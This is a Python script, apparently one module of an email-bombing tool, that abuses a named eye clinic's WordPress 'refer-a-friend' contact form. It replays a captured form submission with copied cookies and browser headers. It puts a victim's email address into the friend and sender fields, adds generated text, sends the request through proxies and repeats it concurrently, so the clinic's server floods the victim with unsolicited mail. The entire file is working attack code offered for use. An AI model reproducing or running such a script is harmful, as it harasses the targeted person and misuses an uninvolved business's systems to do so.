from os.path import basename

import requests

from module import Spam

cookies = {
    'calltrk_referrer': 'https%3A//www.google.com/',
    'calltrk_landing': 'https%3A//www.horizoneye.com/refer-a-friend',
    'calltrk_session_id': '800301f5-0516-42c1-8c98-a5be06966fb4',
    '_fbp': 'fb.1.1674552078102.1208987938',
    '_gid': 'GA1.2.929634321.1676562252',
    '__atssc': 'google%3B2',
    '_gat_UA-28335151-1': '1',
    '__atuvc': '7%7C4%2C0%7C5%2C0%7C6%2C3%7C7',
    '__atuvs': '63ee4f4b742d227e002',
    '_ga': 'GA1.2.1679679617.1674552078',
    '_ga_26M34T3MM5': 'GS1.1.1676562251.4.1.1676562747.0.0.0',
}

headers = {
    'authority': 'www.horizoneye.com',
    'accept': 'application/json, */*;q=0.1',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundarylIX2rNCAn3U2HBLx',
    # 'cookie': 'calltrk_referrer=https%3A//www.google.com/; calltrk_landing=https%3A//www.horizoneye.com/refer-a-friend; calltrk_session_id=800301f5-0516-42c1-8c98-a5be06966fb4; _fbp=fb.1.1674552078102.1208987938; _gid=GA1.2.929634321.1676562252; __atssc=google%3B2; _gat_UA-28335151-1=1; __atuvc=7%7C4%2C0%7C5%2C0%7C6%2C3%7C7; __atuvs=63ee4f4b742d227e002; _ga=GA1.2.1679679617.1674552078; _ga_26M34T3MM5=GS1.1.1676562251.4.1.1676562747.0.0.0',
    'origin': 'https://www.horizoneye.com',
    'referer': 'https://www.horizoneye.com/refer-a-friend',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
}

s = 'Thank you'


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        data = '------WebKitFormBoundarylIX2rNCAn3U2HBLx\r\nContent-Disposition: form-data; name="_wpcf7"\r\n\r\n56737\r\n------WebKitFormBoundarylIX2rNCAn3U2HBLx\r\nContent-Disposition: form-data; name="_wpcf7_version"\r\n\r\n5.7.3\r\n------WebKitFormBoundarylIX2rNCAn3U2HBLx\r\nContent-Disposition: form-data; name="_wpcf7_locale"\r\n\r\nen_US\r\n------WebKitFormBoundarylIX2rNCAn3U2HBLx\r\nContent-Disposition: form-data; name="_wpcf7_unit_tag"\r\n\r\nwpcf7-f56737-p58586-o1\r\n------WebKitFormBoundarylIX2rNCAn3U2HBLx\r\nContent-Disposition: form-data; name="_wpcf7_container_post"\r\n\r\n58586\r\n------WebKitFormBoundarylIX2rNCAn3U2HBLx\r\nContent-Disposition: form-data; name="_wpcf7_posted_data_hash"\r\n\r\n\r\n------WebKitFormBoundarylIX2rNCAn3U2HBLx\r\nContent-Disposition: form-data; name="_wpcf7cf_hidden_group_fields"\r\n\r\n[]\r\n------WebKitFormBoundarylIX2rNCAn3U2HBLx\r\nContent-Disposition: form-data; name="_wpcf7cf_hidden_groups"\r\n\r\n[]\r\n------WebKitFormBoundarylIX2rNCAn3U2HBLx\r\nContent-Disposition: form-data; name="_wpcf7cf_visible_groups"\r\n\r\n[]\r\n------WebKitFormBoundarylIX2rNCAn3U2HBLx\r\nContent-Disposition: form-data; name="_wpcf7cf_repeaters"\r\n\r\n[]\r\n------WebKitFormBoundarylIX2rNCAn3U2HBLx\r\nContent-Disposition: form-data; name="_wpcf7cf_steps"\r\n\r\n{}\r\n------WebKitFormBoundarylIX2rNCAn3U2HBLx\r\nContent-Disposition: form-data; name="_wpcf7cf_options"\r\n\r\n{"form_id":56737,"conditions":[],"settings":{"animation":"yes","animation_intime":200,"animation_outtime":200,"conditions_ui":"normal","notice_dismissed":false,"notice_dismissed_rollback-cf7-5.3.2":true,"notice_dismissed_rollback-cf7-5.5.6":true}}\r\n------WebKitFormBoundarylIX2rNCAn3U2HBLx\r\nContent-Disposition: form-data; name="your-friends-name"\r\n\r\ntest\r\n------WebKitFormBoundarylIX2rNCAn3U2HBLx\r\nContent-Disposition: form-data; name="your-friends-email"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundarylIX2rNCAn3U2HBLx\r\nContent-Disposition: form-data; name="referring-doctor"\r\n\r\n180\r\n------WebKitFormBoundarylIX2rNCAn3U2HBLx\r\nContent-Disposition: form-data; name="your-name"\r\n\r\ntest\r\n------WebKitFormBoundarylIX2rNCAn3U2HBLx\r\nContent-Disposition: form-data; name="your-email"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundarylIX2rNCAn3U2HBLx\r\nContent-Disposition: form-data; name="your-note"\r\n\r\ntest\r\n------WebKitFormBoundarylIX2rNCAn3U2HBLx--\r\n'
        data = data.replace('wezxasqw@gmail.com', target).replace('test', self.get_text())

        response = requests.post(
            'https://www.horizoneye.com/wp-json/contact-form-7/v1/contact-forms/56737/feedback',
            cookies=cookies,
            headers=headers,
            data=data.encode(), proxies=self.get_proxies()
        )
        return response


def main():
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'))
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
